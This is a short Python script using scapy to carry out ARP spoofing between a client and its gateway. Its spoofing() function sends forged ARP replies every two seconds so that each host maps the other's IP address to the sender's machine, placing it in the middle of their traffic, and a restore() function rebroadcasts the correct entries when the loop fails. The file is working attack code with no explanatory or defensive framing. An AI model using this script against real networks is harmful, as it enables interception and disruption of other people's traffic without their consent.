from scapy.all import send
from time import sleep
from scapy.layers.l2 import Ether, ARP

clientIp = None
clientMac = None
gatewayIp = None
gatewayMac = None

## change arp table of gateway, target ##
def spoofing():
    packetForGateway = ARP(op=2, psrc=clientIp, pdst=gatewayIp, hwdst=gatewayMac)
    packetForClient = ARP(op=2, psrc=gatewayIp, pdst=clientIp, hwdst=clientMac)
    
    try:
        while(True):
            send(packetForGateway)
            send(packetForClient)
            
            sleep(2)
    except Exception as err:
        print(err)
        restore()
        print('Program will die')
        exit(-1)
        
## restore arp table ##
def restore():
    packetForClient = ARP(op=2, pdst=clientIp, psrc=gatewayIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=gatewayMac)
    packetForGateway = ARP(op=2, pdst=gatewayIp, psrc=clientIp, hwdst="ff:ff:ff:ff:ff:ff", hwsrc=clientMac)
    
    send(packetForClient)
    send(packetForGateway)
    
def set_variables(a, b, c, d):
    global clientIp, clientMac, gatewayIp, gatewayMac
    clientIp = a
    clientMac = b
    gatewayIp = c
    gatewayMac = d